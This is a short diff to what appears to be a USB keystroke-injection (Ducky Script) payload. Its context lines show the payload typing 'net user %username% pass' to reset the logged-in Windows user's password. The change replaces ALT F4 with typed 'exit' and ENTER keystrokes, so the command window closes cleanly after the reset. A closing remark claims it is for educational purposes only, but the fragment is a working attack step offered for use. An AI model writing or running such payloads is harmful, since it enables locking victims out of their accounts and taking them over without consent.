@@ -23,5 +23,8 @@ Here, password is set to "pass", you can change it. You can also change delay va
     ENTER
     DELAY 150
     STRING net user %username% pass
-    ALT F4
+    DELAY 100
+    STRING exit
+    DELAY 50
+    ENTER
     REM done by zqrk with love, and for educational purposes only!
